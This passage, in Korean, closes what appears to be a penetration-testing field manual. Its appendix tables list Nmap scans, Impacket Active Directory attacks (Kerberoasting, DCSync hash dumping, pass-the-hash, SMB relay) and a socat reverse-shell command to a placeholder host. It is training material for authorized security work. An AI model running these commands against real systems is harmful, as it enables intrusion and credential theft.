3. **컨텍스트(맥락)를 파악하라:** 단순히 기술적인 취약점만 찾지 말고, 해당 서버의 역할(개발 서버, 백업 서버 등)을 이해해야 합니다. 개발 서버라면 소스 코드나 SSH 키가, 백업 서버라면 데이터베이스 덤프가 존재할 가능성이 높습니다.
    
4. **피보팅은 필수다:** Ligolo-ng와 같은 최신 터널링 도구에 대한 숙련도는 AD 환경에서의 작전 수행 능력을 결정짓는 척도입니다.
    

본 필드 매뉴얼이 제공하는 기술적 토대 위에, 상황에 따라 유연하게 전술을 변경할 수 있는 응용력이 더해질 때 비로소 전문적인 공격 보안 전문가로서의 역량이 완성됩니다.

---

### 부록 A: 빠른 참조 명령 테이블 (Quick Reference Command Tables)

다음은 현장에서 즉시 참조할 수 있도록 핵심 명령어들을 요약한 표입니다.

#### **표 1: Nmap 스캔 및 정찰**

|**스캔 유형**|**명령어**|**목적 및 설명**|
|---|---|---|
|**호스트 발견**|`nmap -sn <Subnet>`|핑 스윕(Ping Sweep)을 통해 살아있는 호스트 식별.|
|**고속 스캔**|`nmap -T4 -F <Target>`|상위 100개 포트에 대한 빠른 스캔.|
|**전체 TCP**|`nmap -p- --min-rate 1000 <Target>`|65535개 모든 포트를 고속으로 스캔.|
|**서비스/스크립트**|`nmap -sC -sV -p <Ports> <Target>`|식별된 포트에 대해 버전 탐지 및 기본 취약점 스크립트 실행.|
|**UDP 스캔**|`nmap -sU --top-ports 20 <Target>`|DNS, SNMP 등 주요 UDP 포트 점검.|

#### **표 2: Active Directory 공격 (Impacket)**

|**공격 벡터**|**명령어**|**설명**|
|---|---|---|
|**AS-REP Roast**|`GetNPUsers.py <Dom>/ -usersfile <List> -format hashcat`|사전 인증이 비활성화된 계정의 해시 추출.|
|**Kerberoast**|`GetUserSPNs.py <Dom>/<User>:<Pass> -request`|서비스 계정(SPN)의 TGS 티켓 해시 추출.|
|**DCSync**|`secretsdump.py <Dom>/<User>@<DC_IP>`|도메인 컨트롤러 복제 권한을 이용해 해시 덤프 (관리자 권한 필요).|
|**Pass-the-Hash**|`psexec.py <User>@<IP> -hashes <LM:NTLM>`|패스워드 없이 NTLM 해시만으로 인증 및 쉘 획득.|
|**SMB Relay**|`ntlmrelayx.py -tf <Targets> -smb2support`|SMB 서명이 없는 호스트로 인증 트래픽 중계.|

#### **표 3: 쉘 안정화 기법**

|**방법**|**단계별 명령어**|
|---|---|
|**Python**|1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`<br><br>  <br><br>2. `Ctrl+Z` (백그라운드)<br><br>  <br><br>3. `stty raw -echo; fg` (포그라운드 복귀)<br><br>  <br><br>4. `export TERM=xterm`|
|**Socat**|**리스너:** `socat file:`tty`,raw,echo=0 tcp-listen:4444`<br><br>  <br><br>**클라이언트:** `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444`|
|**Script**|`/usr/bin/script -qc /bin/bash /dev/null` (Python이 없을 때 대안)|

_보고서 끝_